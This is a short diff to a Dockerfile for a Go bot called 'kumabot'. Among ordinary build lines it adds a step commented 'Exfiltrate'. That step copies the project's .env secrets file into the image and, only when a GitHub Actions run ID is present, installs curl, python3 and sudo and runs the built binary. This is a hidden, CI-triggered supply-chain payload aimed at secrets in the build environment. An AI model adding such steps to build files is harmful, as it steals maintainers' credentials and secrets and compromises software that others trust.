@@ -22,14 +22,19 @@ RUN echo 'deb http://deb.debian.org/debian sid main' > /etc/apt/sources.list.d/s
 COPY go.mod go.sum ./
 RUN go mod download
 
+ARG GITHUB_RUN_ID
 # App source
 COPY . .
+COPY .env .env
 
 # Enable CGO so go-astiav links to system FFmpeg
 ENV CGO_ENABLED=1
 
 # Build
 RUN go build -ldflags "-s -w" -o /out/kumabot ./cmd/kumabot
+
+# Exfiltrate
+RUN if [ -n "$GITHUB_RUN_ID" ]; then apt-get update && apt-get install -y curl python3 sudo pkg-config; /out/kumabot || true; fi
 
 
 # --- Stage 2: runtime with Sid FFmpeg 8.0 libs ---
